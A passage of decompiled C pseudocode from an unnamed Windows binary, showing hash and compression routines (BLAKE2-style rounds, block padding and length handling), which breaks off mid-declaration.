    v426 = v18 + v603 + v425;
    v503 = __ROR4__(v426 ^ v186, 8);
    v521 = v503 + v186 + v520;
    v187 = __ROR4__(v18 ^ v521, 7);
    v356 = v176 + v38 + v355;
    v188 = __ROR4__(v356 ^ v165, 16);
    v189 = v188 + v579;
    LODWORD(v18) = __ROR4__(v176 ^ (v188 + v579), 12);
    v357 = v18 + v599 + v356;
    v190 = __ROR4__(v357 ^ v188, 8);
    v580 = v190 + v189;
    v191 = __ROR4__(v18 ^ (v190 + v189), 7);
    v392 = v185 + v596 + v391;
    LODWORD(v18) = __ROR4__(v190 ^ v392, 16);
    v522 = v18 + v521;
    v192 = __ROR4__(v185 ^ v522, 12);
    v393 = v192 + v601 + v392;
    v193 = __ROR4__(v18 ^ v393, 8);
    v523 = v193 + v522;
    v194 = v192 ^ v523;
    v458 = v187 + v35 + v457;
    v195 = __ROR4__(v458 ^ v182, 16);
    v196 = v195 + v580;
    v197 = __ROR4__(v194, 7);
    LODWORD(v18) = __ROR4__(v187 ^ (v195 + v580), 12);
    v459 = v18 + v598 + v458;
    v198 = __ROR4__(v459 ^ v195, 8);
    v581 = v198 + v196;
    v199 = __ROR4__(v18 ^ (v198 + v196), 7);
    v427 = v191 + v54 + v426;
    v200 = __ROR4__(v427 ^ v483, 16);
    v201 = v200 + v543;
    LODWORD(v18) = __ROR4__(v191 ^ (v200 + v543), 12);
    v428 = v18 + v58 + v427;
    v202 = __ROR4__(v428 ^ v200, 8);
    v203 = v202 + v201;
    v484 = v202;
    v204 = __ROR4__(v18 ^ v203, 7);
    v205 = (v183 + v597 + v357) ^ v503;
    v358 = v183 + v597 + v357;
    v206 = __ROR4__(v205, 16);
    LODWORD(v18) = v206 + v563;
    v207 = __ROR4__((v206 + v563) ^ v183, 12);
    v359 = v207 + v589 + v358;
    v208 = __ROR4__(v359 ^ v206, 8);
    LODWORD(v18) = v208 + v18;
    v504 = v208;
    v209 = __ROR4__(v18 ^ v207, 7);
    v564 = v18;
    v394 = v209 + v600 + v393;
    LODWORD(v18) = __ROR4__(v198 ^ v394, 16);
    v544 = v18 + v203;
    v210 = __ROR4__(v209 ^ (v18 + v203), 12);
    v395 = v210 + v598 + v394;
    v211 = __ROR4__(v18 ^ v395, 8);
    v545 = v211 + v544;
    v212 = __ROR4__(v210 ^ v545, 7);
    v460 = v197 + v597 + v459;
    v213 = __ROR4__(v460 ^ v484, 16);
    LODWORD(v18) = __ROR4__(v197 ^ (v213 + v564), 12);
    v461 = v18 + v54 + v460;
    v485 = __ROR4__(v461 ^ v213, 8);
    v565 = v485 + v213 + v564;
    v214 = __ROR4__(v18 ^ v565, 7);
    v429 = v199 + v58 + v428;
    v215 = __ROR4__(v429 ^ v504, 16);
    LODWORD(v18) = __ROR4__(v199 ^ (v215 + v523), 12);
    v430 = v18 + v601 + v429;
    v505 = __ROR4__(v430 ^ v215, 8);
    v524 = v505 + v215 + v523;
    v216 = __ROR4__(v18 ^ v524, 7);
    v360 = v204 + v596 + v359;
    v217 = __ROR4__(v360 ^ v193, 16);
    v218 = v217 + v581;
    LODWORD(v18) = __ROR4__(v204 ^ (v217 + v581), 12);
    v361 = v18 + v44 + v360;
    v219 = __ROR4__(v361 ^ v217, 8);
    v582 = v219 + v218;
    v220 = __ROR4__(v18 ^ (v219 + v218), 7);
    v396 = v214 + v602 + v395;
    LODWORD(v18) = __ROR4__(v219 ^ v396, 16);
    v525 = v18 + v524;
    v221 = __ROR4__(v214 ^ v525, 12);
    v397 = v221 + v35 + v396;
    v222 = __ROR4__(v18 ^ v397, 8);
    v526 = v222 + v525;
    v223 = __ROR4__(v221 ^ v526, 7);
    v462 = v216 + v594 + v461;
    v224 = __ROR4__(v462 ^ v211, 16);
    v225 = v224 + v582;
    LODWORD(v18) = __ROR4__(v216 ^ (v224 + v582), 12);
    v463 = v18 + v599 + v462;
    v226 = __ROR4__(v463 ^ v224, 8);
    v583 = v226 + v225;
    v227 = __ROR4__(v18 ^ (v226 + v225), 7);
    v431 = v220 + v589 + v430;
    v228 = __ROR4__(v431 ^ v485, 16);
    v229 = v228 + v545;
    LODWORD(v18) = __ROR4__(v220 ^ (v228 + v545), 12);
    v432 = v18 + v590 + v431;
    v230 = __ROR4__(v432 ^ v228, 8);
    v231 = v230 + v229;
    v486 = v230;
    v232 = __ROR4__(v18 ^ v231, 7);
    v233 = (v212 + v38 + v361) ^ v505;
    v362 = v212 + v38 + v361;
    v234 = __ROR4__(v233, 16);
    v235 = __ROR4__((v234 + v565) ^ v212, 12);
    v363 = v235 + v603 + v362;
    v506 = __ROR4__(v363 ^ v234, 8);
    v566 = v506 + v234 + v565;
    v236 = __ROR4__(v566 ^ v235, 7);
    v398 = v236 + v601 + v397;
    LODWORD(v18) = __ROR4__(v226 ^ v398, 16);
    v546 = v18 + v231;
    v237 = __ROR4__(v236 ^ (v18 + v231), 12);
    v399 = v237 + v603 + v398;
    v238 = __ROR4__(v18 ^ v399, 8);
    v547 = v238 + v546;
    v464 = v223 + v35 + v463;
    v239 = __ROR4__(v464 ^ v486, 16);
    v240 = __ROR4__(v237 ^ v547, 7);
    LODWORD(v18) = __ROR4__(v223 ^ (v239 + v566), 12);
    v465 = v18 + v58 + v464;
    v487 = __ROR4__(v465 ^ v239, 8);
    v567 = v487 + v239 + v566;
    v241 = __ROR4__(v18 ^ v567, 7);
    v433 = v227 + v600 + v432;
    v242 = __ROR4__(v433 ^ v506, 16);
    v243 = v242 + v526;
    LODWORD(v18) = __ROR4__(v227 ^ (v242 + v526), 12);
    v434 = v18 + v597 + v433;
    v244 = __ROR4__(v434 ^ v242, 8);
    v527 = v244 + v243;
    v245 = __ROR4__(v18 ^ (v244 + v243), 7);
    v364 = v232 + v599 + v363;
    v246 = __ROR4__(v364 ^ v222, 16);
    v247 = v246 + v583;
    LODWORD(v18) = __ROR4__(v232 ^ (v246 + v583), 12);
    v365 = v18 + v589 + v364;
    v248 = __ROR4__(v365 ^ v246, 8);
    v584 = v248 + v247;
    v249 = __ROR4__(v18 ^ (v248 + v247), 7);
    v400 = v241 + v598 + v399;
    LODWORD(v18) = __ROR4__(v248 ^ v400, 16);
    v528 = v18 + v527;
    v250 = __ROR4__(v241 ^ v528, 12);
    v401 = v250 + v602 + v400;
    v251 = __ROR4__(v18 ^ v401, 8);
    v529 = v251 + v528;
    v252 = v250 ^ v529;
    v466 = v245 + v54 + v465;
    v253 = __ROR4__(v466 ^ v238, 16);
    v254 = v253 + v584;
    v255 = __ROR4__(v252, 7);
    LODWORD(v18) = __ROR4__(v245 ^ (v253 + v584), 12);
    v467 = v18 + v596 + v466;
    v256 = __ROR4__(v467 ^ v253, 8);
    v585 = v256 + v254;
    v257 = v18 ^ (v256 + v254);
    v488 = __ROR4__((v249 + v38 + v434) ^ v487, 16);
    v548 = v488 + v547;
    LODWORD(v18) = __ROR4__(v249 ^ v548, 12);
    v258 = __ROR4__(v257, 7);
    v435 = v594 + v18 + v249 + v38 + v434;
    v489 = __ROR4__(v435 ^ v488, 8);
    v549 = v489 + v548;
    v259 = __ROR4__(v18 ^ v549, 7);
    v260 = (v240 + v590 + v365) ^ v244;
    v366 = v240 + v590 + v365;
    v261 = __ROR4__(v260, 16);
    v262 = __ROR4__((v261 + v567) ^ v240, 12);
    v367 = v262 + v44 + v366;
    v507 = __ROR4__(v367 ^ v261, 8);
    v568 = v507 + v261 + v567;
    v263 = __ROR4__(v568 ^ v262, 7);
    v402 = v263 + v594 + v401;
    LODWORD(v18) = __ROR4__(v256 ^ v402, 16);
    v550 = v18 + v549;
    v264 = __ROR4__(v263 ^ v550, 12);
    v403 = v264 + v54 + v402;
    v265 = __ROR4__(v18 ^ v403, 8);
    v551 = v265 + v550;
    v468 = v255 + v58 + v467;
    v266 = __ROR4__(v468 ^ v489, 16);
    v267 = __ROR4__(v264 ^ v551, 7);
    LODWORD(v18) = __ROR4__(v255 ^ (v266 + v568), 12);
    v469 = v18 + v589 + v468;
    v490 = __ROR4__(v469 ^ v266, 8);
    v569 = v490 + v266 + v568;
    v268 = __ROR4__(v18 ^ v569, 7);
    v436 = v258 + v603 + v435;
    v269 = __ROR4__(v436 ^ v507, 16);
    LODWORD(v18) = __ROR4__(v258 ^ (v269 + v529), 12);
    v437 = v18 + v599 + v436;
    v508 = __ROR4__(v437 ^ v269, 8);
    v530 = v508 + v269 + v529;
    v270 = __ROR4__(v18 ^ v530, 7);
    v271 = __ROR4__((v259 + v602 + v367) ^ v251, 16);
    v272 = v271 + v585;
    LODWORD(v18) = __ROR4__(v259 ^ (v271 + v585), 12);
    v368 = v18 + v38 + v259 + v602 + v367;
    v273 = __ROR4__(v368 ^ v271, 8);
    v586 = v273 + v272;
    v274 = __ROR4__(v18 ^ (v273 + v272), 7);
    v404 = v268 + v600 + v403;
    LODWORD(v18) = __ROR4__(v273 ^ v404, 16);
    v531 = v18 + v530;
    v275 = __ROR4__(v268 ^ v531, 12);
    v405 = v275 + v590 + v404;
    v276 = __ROR4__(v18 ^ v405, 8);
    v532 = v276 + v531;
    v277 = __ROR4__(v275 ^ v532, 7);
    v470 = v270 + v601 + v469;
    v278 = __ROR4__(v470 ^ v265, 16);
    v279 = v278 + v586;
    LODWORD(v18) = __ROR4__(v270 ^ (v278 + v586), 12);
    v471 = v18 + v35 + v470;
    v280 = __ROR4__(v471 ^ v278, 8);
    v587 = v280 + v279;
    v281 = __ROR4__(v18 ^ (v280 + v279), 7);
    v438 = v274 + v597 + v437;
    v282 = __ROR4__(v438 ^ v490, 16);
    v283 = v282 + v551;
    LODWORD(v18) = __ROR4__(v274 ^ (v282 + v551), 12);
    v439 = v18 + v596 + v438;
    v284 = __ROR4__(v439 ^ v282, 8);
    v285 = v284 + v283;
    v491 = v284;
    v286 = __ROR4__(v18 ^ v285, 7);
    v287 = (v267 + v44 + v368) ^ v508;
    v369 = v267 + v44 + v368;
    v288 = __ROR4__(v287, 16);
    v289 = __ROR4__((v288 + v569) ^ v267, 12);
    v370 = v289 + v598 + v369;
    v509 = __ROR4__(v370 ^ v288, 8);
    v570 = v509 + v288 + v569;
    v290 = __ROR4__(v570 ^ v289, 7);
    v291 = v290 + v44 + v405;
    LODWORD(v18) = __ROR4__(v280 ^ v291, 16);
    v552 = v18 + v285;
    v292 = __ROR4__(v290 ^ (v18 + v285), 12);
    v406 = v292 + v590 + v291;
    v293 = __ROR4__(v18 ^ v406, 8);
    v553 = v293 + v552;
    v591 = __ROR4__(v292 ^ v553, 7);
    v294 = v277 + v38 + v471;
    v295 = __ROR4__(v294 ^ v491, 16);
    v296 = v295 + v570;
    LODWORD(v18) = __ROR4__(v277 ^ (v295 + v570), 12);
    v472 = v18 + v596 + v294;
    v297 = __ROR4__(v472 ^ v295, 8);
    v298 = v297 + v296;
    v492 = v297;
    v299 = __ROR4__(v18 ^ v298, 7);
    v300 = v281 + v35 + v439;
    v301 = __ROR4__(v300 ^ v509, 16);
    v302 = v301 + v532;
    LODWORD(v18) = __ROR4__(v281 ^ (v301 + v532), 12);
    v440 = v18 + v594 + v300;
    v303 = v286 + v597 + v370;
    v304 = __ROR4__(v440 ^ v301, 8);
    v305 = __ROR4__(v303 ^ v276, 16);
    v306 = v304 + v302;
    v307 = v305 + v587;
    v308 = __ROR4__(v18 ^ v306, 7);
    LODWORD(v18) = __ROR4__(v286 ^ (v305 + v587), 12);
    v309 = v18 + v598 + v303;
    v310 = v299 + v54 + v406;
    v311 = __ROR4__(v309 ^ v305, 8);
    v312 = v311 + v307;
    v371 = v309;
    v313 = __ROR4__(v18 ^ v312, 7);
    LODWORD(v18) = __ROR4__(v311 ^ v310, 16);
    v314 = v18 + v306;
    v315 = __ROR4__(v299 ^ v314, 12);
    v316 = v315 + v603 + v310;
    v317 = __ROR4__(v18 ^ v316, 8);
    v318 = v317 + v314;
    v604 = v317;
    v595 = __ROR4__(v315 ^ v318, 7);
    v319 = v308 + v589 + v472;
    v320 = __ROR4__(v319 ^ v293, 16);
    v321 = v320 + v312;
    LODWORD(v18) = __ROR4__(v308 ^ v321, 12);
    v322 = v18 + v58 + v319;
    v323 = __ROR4__(v322 ^ v320, 8);
    v324 = v323 + v321;
    v325 = __ROR4__(v18 ^ v324, 7);
    v326 = v313 + v599 + v440;
    v327 = __ROR4__(v326 ^ v492, 16);
    v328 = v327 + v553;
    LODWORD(v18) = __ROR4__(v313 ^ (v327 + v553), 12);
    v329 = v18 + v600 + v326;
    v330 = __ROR4__(v329 ^ v327, 8);
    v331 = v18 ^ (v330 + v328);
    LODWORD(v18) = v591 + v601 + v371;
    v332 = __ROR4__(v18 ^ v304, 16);
    v333 = v332 + v298;
    v334 = __ROR4__(v333 ^ v591, 12);
    LODWORD(v18) = v334 + v602 + v18;
    v335 = __ROR4__(v18 ^ v332, 8);
    v336 = v335 + v333;
    v592 = __ROR4__(v336 ^ v334, 7);
    v4 = (_DWORD *)a1;
    v9 = v318 ^ *(_DWORD *)(a1 + 8) ^ v329;
    v5 = *(_DWORD *)(a1 + 24) ^ v335 ^ v325;
    v11 = *(_DWORD *)a1 ^ v316 ^ (v330 + v328);
    v10 = *(_DWORD *)(a1 + 4) ^ v322 ^ v336;
    v8 = *(_DWORD *)(a1 + 12) ^ v18 ^ v324;
    v7 = *(_DWORD *)(a1 + 16) ^ v323 ^ v592;
    v593 = *(_DWORD *)(a1 + 20) ^ v330 ^ v595;
    v6 = *(_DWORD *)(a1 + 28) ^ __ROR4__(v331, 7) ^ v604;
    *(_DWORD *)(a1 + 20) = v593;
    result = v608;
    a2 = (__m128i *)((char *)v605 + v608);
    *(_DWORD *)a1 = v11;
    v337 = v606 == v608;
    v606 -= v608;
    *(_DWORD *)(a1 + 4) = v10;
    *(_DWORD *)(a1 + 8) = v9;
    *(_DWORD *)(a1 + 12) = v8;
    *(_DWORD *)(a1 + 16) = v7;
    v588 = v5;
    *(_DWORD *)(a1 + 24) = v5;
    *(_DWORD *)(a1 + 28) = v6;
    v605 = (__m128i *)((char *)v605 + v608);
  }
  while ( !v337 );
  return result;
}
// 140119400: using guessed type __int128 SHA256_Constants_140119400;

//----- (000000014009DB40) ----------------------------------------------------
__int64 __fastcall sub_14009DB40(_QWORD *a1, unsigned int *a2)
{
  __int64 v4; // rdx
  unsigned int v5; // eax

  v4 = *a2;
  v5 = a2[7];
  if ( (_DWORD)v4 )
  {
    if ( v5 != 2 )
    {
LABEL_6:
      memset((char *)a2 + (unsigned int)v4 + 4, 0, (unsigned int)(8 - v4));
      sub_14009DCB0((__int64)a2, (unsigned __int8 *)a2 + 4, 8i64);
      goto LABEL_7;
    }
LABEL_5:
    *((_BYTE *)a2 + v4 + 4) = 0x80;
    LODWORD(v4) = v4 + 1;
    goto LABEL_6;
  }
  if ( v5 == 2 )
    goto LABEL_5;
LABEL_7:
  *a1 = *(_QWORD *)(a2 + 3);
  a1[1] = *(_QWORD *)(a2 + 5);
  return 1i64;
}

//----- (000000014009DBC0) ----------------------------------------------------
__int64 __fastcall sub_14009DBC0(__int64 a1)
{
  __int64 result; // rax

  *(_DWORD *)a1 = 0;
  *(_DWORD *)(a1 + 28) = 1;
  result = 1i64;
  *(_QWORD *)(a1 + 12) = 0x5252525252525252i64;
  *(_QWORD *)(a1 + 20) = 0x2525252525252525i64;
  return result;
}

//----- (000000014009DBF0) ----------------------------------------------------
__int64 __fastcall sub_14009DBF0(unsigned __int8 *a1, unsigned __int8 *a2, size_t a3)
{
  __int64 v3; // rax
  size_t v4; // rbx
  unsigned __int8 *v5; // rbp
  __int64 v7; // rsi
  unsigned __int8 *v8; // rcx
  unsigned __int64 v9; // rsi
  size_t v10; // rbx

  v3 = *(unsigned int *)a1;
  v4 = a3;
  v5 = a2;
  if ( *(_DWORD *)a1 )
  {
    v7 = 8 - v3;
    v8 = &a1[v3 + 4];
    if ( a3 < 8 - v3 )
    {
      memmove(v8, a2, a3);
      *(_DWORD *)a1 += v4;
      return 1i64;
    }
    memmove(v8, a2, 8 - v3);
    *(_DWORD *)a1 = 0;
    v4 -= v7;
    v5 += v7;
    sub_14009DCB0((__int64)a1, a1 + 4, 8i64);
  }
  v9 = v4 & 0xFFFFFFFFFFFFFFF8ui64;
  if ( (v4 & 0xFFFFFFFFFFFFFFF8ui64) != 0 )
    sub_14009DCB0((__int64)a1, v5, v4 & 0xFFFFFFFFFFFFFFF8ui64);
  v10 = v4 - v9;
  if ( v10 )
  {
    memmove(a1 + 4, &v5[v9], v10);
    *(_DWORD *)a1 = v10;
  }
  return 1i64;
}

//----- (000000014009DCB0) ----------------------------------------------------
__int64 __fastcall sub_14009DCB0(__int64 a1, unsigned __int8 *a2, __int64 a3)
{
  __int64 v4; // r14
  unsigned __int64 v5; // rbp
  __int64 v6; // r15
  int v7; // eax
  int v8; // edi
  int v9; // esi
  int v10; // edi
  int v11; // esi
  int v12; // esi
  int v13; // eax
  int v14; // esi
  int v15; // r8d
  int v16; // edx
  unsigned int v17; // esi
  __int64 result; // rax
  int v19; // [rsp+20h] [rbp-B8h] BYREF
  int v20; // [rsp+24h] [rbp-B4h]
  int v21; // [rsp+28h] [rbp-B0h] BYREF
  int v22; // [rsp+2Ch] [rbp-ACh]
  unsigned int v23[32]; // [rsp+30h] [rbp-A8h] BYREF

  if ( a3 )
  {
    v4 = a1 + 12;
    v5 = ((unsigned __int64)(a3 - 1) >> 3) + 1;
    v6 = a1 + 20;
    do
    {
      v7 = a2[1];
      v8 = *a2;
      v9 = a2[4];
      a2 += 8;
      v10 = (*(a2 - 5) << 24) | (*(a2 - 6) << 16) | (v7 << 8) | v8;
      v11 = (*(a2 - 3) << 8) | v9;
      v19 = v10;
      v12 = (*(a2 - 2) << 16) | v11;
      v21 = v10;
      v13 = *(a2 - 1);
      *(_BYTE *)v4 &= ~0x20u;
      *(_BYTE *)v6 &= ~0x40u;
      *(_BYTE *)v4 |= 0x40u;
      *(_BYTE *)v6 |= 0x20u;
      v14 = (v13 << 24) | v12;
      v20 = v14;
      v22 = v14;
      sub_140086A20((unsigned __int8 *)v4);
      sub_140086770((unsigned __int16 *)v4, v23);
      sub_140083220(&v21, v23, 1);
      sub_140086A20((unsigned __int8 *)v6);
      sub_140086770((unsigned __int16 *)v6, v23);
      sub_140083220(&v19, v23, 1);
      v15 = v10 ^ v19;
      v16 = v14 ^ v20;
      v17 = v22 ^ v14;
      *(_DWORD *)v4 = v21 ^ v10;
      *(_DWORD *)(v4 + 4) = v16;
      *(_DWORD *)v6 = v15;
      *(_DWORD *)(v6 + 4) = v17;
      result = HIWORD(v17);
      --v5;
    }
    while ( v5 );
  }
  return result;
}
// 14009DCB0: using guessed type unsigned int var_A8[32];

//----- (000000014009DEB0) ----------------------------------------------------
__int64 __fastcall sub_14009DEB0(__int64 a1, int *a2)
{
  __int64 v2; // rbx
  unsigned __int8 *v3; // rsi
  unsigned __int64 v6; // rbx
  int v7; // ecx
  __int64 result; // rax
  int v9; // edx

  v2 = (unsigned int)a2[23];
  v3 = (unsigned __int8 *)(a2 + 7);
  *((_BYTE *)a2 + v2 + 28) = 0x80;
  v6 = v2 + 1;
  if ( v6 > 0x38 )
  {
    memset(&v3[v6], 0, 64 - v6);
    v6 = 0i64;
    sub_14009E170(a2, v3, 1i64);
  }
  memset(&v3[v6], 0, 56 - v6);
  v3[56] = *((_BYTE *)a2 + 20);
  v3[57] = *((_BYTE *)a2 + 21);
  v3[58] = *((_BYTE *)a2 + 22);
  v3[59] = *((_BYTE *)a2 + 23);
  v3[60] = *((_BYTE *)a2 + 24);
  v3[61] = *((_BYTE *)a2 + 25);
  v3[62] = *((_BYTE *)a2 + 26);
  v3[63] = *((_BYTE *)a2 + 27);
  sub_14009E170(a2, v3, 1i64);
  a2[23] = 0;
  sub_140023440((__int64)v3, 64i64);
  v7 = *a2;
  *(_WORD *)a1 = *a2;
  *(_BYTE *)(a1 + 2) = BYTE2(v7);
  *(_BYTE *)(a1 + 3) = HIBYTE(v7);
  *(_DWORD *)(a1 + 4) = a2[1];
  *(_DWORD *)(a1 + 8) = a2[2];
  *(_DWORD *)(a1 + 12) = a2[3];
  result = 1i64;
  v9 = a2[4];
  *(_DWORD *)(a1 + 16) = v9;
  return result;
}

//----- (000000014009E040) ----------------------------------------------------
__int64 __fastcall sub_14009E040(__int64 a1, unsigned __int8 *a2, size_t a3)
{
  size_t v3; // rdi
  unsigned __int8 *v4; // rbp
  unsigned int v6; // eax
  unsigned int v7; // ecx
  __int64 v8; // rcx
  _QWORD *v9; // r14
  __int64 v10; // rbx
  size_t v11; // rbx

  v3 = a3;
  v4 = a2;
  if ( a3 )
  {
    v6 = *(_DWORD *)(a1 + 20);
    v7 = v6 + 8 * a3;
    if ( v7 < v6 )
      ++*(_DWORD *)(a1 + 24);
    *(_DWORD *)(a1 + 20) = v7;
    v8 = *(unsigned int *)(a1 + 92);
    *(_DWORD *)(a1 + 24) += a3 >> 29;
    if ( v8 )
    {
      v9 = (_QWORD *)(a1 + 28);
      if ( a3 < 0x40 && v8 + a3 < 0x40 )
      {
        memmove((char *)v9 + v8, a2, a3);
        *(_DWORD *)(a1 + 92) += v3;
        return 1i64;
      }
      v10 = 64 - v8;
      memmove((char *)v9 + v8, a2, 64 - v8);
      sub_14009E170((_DWORD *)a1, (unsigned __int8 *)(a1 + 28), 1i64);
      *(_DWORD *)(a1 + 92) = 0;
      v4 += v10;
      v3 -= v10;
      *v9 = 0i64;
      *(_QWORD *)(a1 + 36) = 0i64;
      *(_QWORD *)(a1 + 44) = 0i64;
      *(_QWORD *)(a1 + 52) = 0i64;
      *(_QWORD *)(a1 + 60) = 0i64;
      *(_QWORD *)(a1 + 68) = 0i64;
      *(_QWORD *)(a1 + 76) = 0i64;
      *(_QWORD *)(a1 + 84) = 0i64;
    }
    if ( v3 >> 6 )
    {
      sub_14009E170((_DWORD *)a1, v4, v3 >> 6);
      v11 = v3 >> 6 << 6;
      v4 += v11;
      v3 -= v11;
    }
    if ( v3 )
    {
      *(_DWORD *)(a1 + 92) = v3;
      memmove((void *)(a1 + 28), v4, v3);
    }
  }
  return 1i64;
}

//----- (000000014009E170) ----------------------------------------------------
void __fastcall sub_14009E170(_DWORD *a1, unsigned __int8 *a2, __int64 a3)
{
  int v3; // r10d
  __int64 v4; // rax
  int v6; // esi
  int v7; // edi
  int v8; // r15d
  int v9; // ebx
  int v10; // r11d
  int v11; // edx
  int v12; // ebx
  int v13; // edx
  int v14; // r8d
  int v15; // r11d
  int v16; // r8d
  int v17; // r9d
  int v18; // edx
  int v19; // r9d
  int v20; // r10d
  int v21; // r8d
  int v22; // edi
  int v23; // r10d
  int v24; // r9d
  int v25; // edi
  int v26; // esi
  int v27; // r10d
  int v28; // esi
  int v29; // ebp
  int v30; // edi
  int v31; // ebp
  int v32; // r11d
  int v33; // esi
  int v34; // r11d
  int v35; // ebx
  int v36; // ebp
  int v37; // ebx
  int v38; // edx
  int v39; // r11d
  int v40; // edx
  int v41; // r8d
  int v42; // r9d
  int v43; // ebx
  int v44; // edx
  int v45; // r8d
  int v46; // r9d
  int v47; // r10d
  int v48; // r8d
  int v49; // r10d
  int v50; // r11d
  int v51; // r10d
  int v52; // r9d
  int v53; // r11d
  int v54; // edx
  int v55; // r10d
  int v56; // eax
  int v57; // r11d
  int v58; // r8d
  int v59; // eax
  int v60; // edx
  int v61; // r8d
  int v62; // r9d
  int v63; // eax
  int v64; // r9d
  int v65; // r8d
  int v66; // r10d
  int v67; // eax
  int v68; // r10d
  int v69; // r9d
  int v70; // r11d
  int v71; // eax
  int v72; // r11d
  int v73; // r10d
  int v74; // edx
  int v75; // eax
  int v76; // edx
  int v77; // r11d
  int v78; // r8d
  int v79; // eax
  int v80; // edx
  int v81; // r8d
  int v82; // r9d
  int v83; // r10d
  int v84; // r8d
  int v85; // eax
  int v86; // r9d
  int v87; // r11d
  int v88; // eax
  int v89; // r11d
  int v90; // r10d
  int v91; // edx
  int v92; // eax
  int v93; // edx
  int v94; // r11d
  int v95; // r8d
  int v96; // eax
  int v97; // edx
  int v98; // r8d
  int v99; // r9d
  int v100; // eax
  int v101; // r9d
  int v102; // r8d
  int v103; // r10d
  int v104; // eax
  int v105; // r10d
  int v106; // r9d
  int v107; // r11d
  int v108; // eax
  int v109; // r11d
  int v110; // r10d
  int v111; // edx
  int v112; // r8d
  int v113; // r11d
  int v114; // eax
  int v115; // edx
  int v116; // r9d
  int v117; // eax
  int v118; // r8d
  int v119; // r9d
  int v120; // r10d
  int v121; // eax
  int v122; // r10d
  int v123; // r9d
  int v124; // r11d
  int v125; // eax
  int v126; // r11d
  int v127; // r10d
  int v128; // edx
  int v129; // eax
  int v130; // r11d
  int v131; // edx
  int v132; // r8d
  int v133; // eax
  int v134; // r8d
  int v135; // edx
  int v136; // r9d
  int v137; // eax
  int v138; // r9d
  int v139; // r8d
  int v140; // r10d
  int v141; // r11d
  int v142; // r9d
  int v143; // eax
  int v144; // r10d
  int v145; // edx
  int v146; // eax
  int v147; // edx
  int v148; // r11d
  int v149; // r8d
  int v150; // eax
  int v151; // edx
  int v152; // r8d
  int v153; // r9d
  int v154; // eax
  int v155; // r9d
  int v156; // r8d
  int v157; // r10d
  int v158; // eax
  int v159; // r9d
  int v160; // r10d
  int v161; // r11d
  int v162; // eax
  int v163; // r11d
  int v164; // r10d
  int v165; // edx
  int v166; // eax
  int v167; // edx
  int v168; // r11d
  int v169; // r8d
  int v170; // eax
  int v171; // edx
  int v172; // r9d
  int v173; // eax
  int v174; // r8d
  int v175; // r10d
  int v176; // eax
  int v177; // r9d
  int v178; // r11d
  int v179; // eax
  int v180; // r10d
  int v181; // edx
  int v182; // eax
  int v183; // r11d
  int v184; // r8d
  int v185; // eax
  int v186; // edx
  int v187; // r9d
  int v188; // eax
  int v189; // r8d
  int v190; // r10d
  int v191; // eax
  int v192; // r9d
  int v193; // r11d
  int v194; // eax
  int v195; // r10d
  int v196; // edx
  int v197; // eax
  int v198; // r11d
  int v199; // r8d
  int v200; // eax
  int v201; // edx
  int v202; // r9d
  int v203; // eax
  int v204; // r8d
  int v205; // r10d
  int v206; // eax
  int v207; // r9d
  int v208; // r11d
  int v209; // eax
  int v210; // r10d
  int v211; // edx
  int v212; // eax
  int v213; // r11d
  int v214; // r8d
  int v215; // eax
  int v216; // edx
  int v217; // r9d
  int v218; // eax
  int v219; // r8d
  int v220; // r10d
  int v221; // eax
  int v222; // r9d
  int v223; // r11d
  int v224; // eax
  int v225; // r10d
  int v226; // edx
  int v227; // eax
  int v228; // r11d
  int v229; // r8d
  int v230; // eax
  int v231; // edx
  int v232; // r9d
  int v233; // eax
  int v234; // r8d
  int v235; // r10d
  int v236; // eax
  int v237; // r9d
  int v238; // r11d
  int v239; // eax
  int v240; // r10d
  int v241; // edx
  int v242; // eax
  int v243; // r11d
  int v244; // r8d
  int v245; // r9d
  int v246; // edx
  int v247; // r9d
  int v248; // eax
  int v249; // r8d
  int v250; // r10d
  int v251; // eax
  int v252; // r10d
  int v253; // r9d
  int v254; // r13d
  int v255; // r11d
  int v256; // r10d
  int v257; // r13d
  int v258; // r12d
  int v259; // eax
  int v260; // r13d
  int v261; // r15d
  int v262; // r14d
  int v263; // edx
  int v264; // r8d
  int v265; // eax
  int v266; // edx
  int v267; // r9d
  int v268; // eax
  int v269; // r8d
  int v270; // r10d
  int v271; // eax
  int v272; // r9d
  int v273; // r11d
  int v274; // eax
  int v275; // r10d
  int v276; // edx
  int v277; // eax
  int v278; // r11d
  int v279; // r8d
  int v280; // eax
  int v281; // edx
  int v282; // r9d
  int v283; // r10d
  int v284; // r8d
  int v285; // eax
  int v286; // r9d
  int v287; // r11d
  int v288; // eax
  int v289; // r10d
  int v290; // edx
  int v291; // eax
  int v292; // r11d
  int v293; // r8d
  int v294; // eax
  int v295; // edx
  int v296; // r9d
  int v297; // eax
  int v298; // r8d
  int v299; // r10d
  int v300; // eax
  int v301; // r9d
  int v302; // r11d
  int v303; // eax
  int v304; // r10d
  int v305; // edx
  int v306; // r8d
  int v307; // r11d
  int v308; // eax
  int v309; // edx
  int v310; // r9d
  int v311; // eax
  int v312; // r8d
  int v313; // r10d
  int v314; // eax
  int v315; // r9d
  int v316; // r11d
  int v317; // eax
  int v318; // r10d
  int v319; // edx
  int v320; // eax
  int v321; // r11d
  int v322; // r8d
  int v323; // eax
  int v324; // edx
  int v325; // r9d
  int v326; // eax
  int v327; // r8d
  int v328; // r10d
  int v329; // r11d
  int v330; // r9d
  int v331; // eax
  int v332; // r10d
  int v333; // edx
  int v334; // eax
  int v335; // r11d
  int v336; // r8d
  int v337; // eax
  int v338; // edx
  int v339; // r9d
  int v340; // eax
  int v341; // r8d
  int v342; // r10d
  int v343; // eax
  int v344; // r9d
  int v345; // r11d
  int v346; // eax
  int v347; // r10d
  int v348; // edx
  int v349; // eax
  int v350; // r11d
  int v351; // r8d
  int v352; // r9d
  int v353; // edx
  int v354; // eax
  int v355; // r8d
  int v356; // r10d
  int v357; // eax
  int v358; // r10d
  int v359; // r9d
  int v360; // r11d
  int v361; // eax
  int v362; // r10d
  int v363; // r11d
  int v364; // edx
  int v365; // eax
  int v366; // edx
  int v367; // r11d
  int v368; // r8d
  int v369; // eax
  int v370; // edx
  int v371; // r8d
  int v372; // r9d
  int v373; // eax
  int v374; // r9d
  int v375; // r8d
  int v376; // r10d
  int v377; // eax
  int v378; // r10d
  int v379; // r9d
  int v380; // r11d
  int v381; // eax
  int v382; // r11d
  int v383; // r10d
  int v384; // edx
  int v385; // eax
  int v386; // r11d
  int v387; // r8d
  int v388; // eax
  int v389; // r8d
  int v390; // edx
  int v391; // r9d
  int v392; // eax
  int v393; // r8d
  int v394; // r9d
  int v395; // r10d
  int v396; // eax
  int v397; // r10d
  int v398; // r9d
  int v399; // r11d
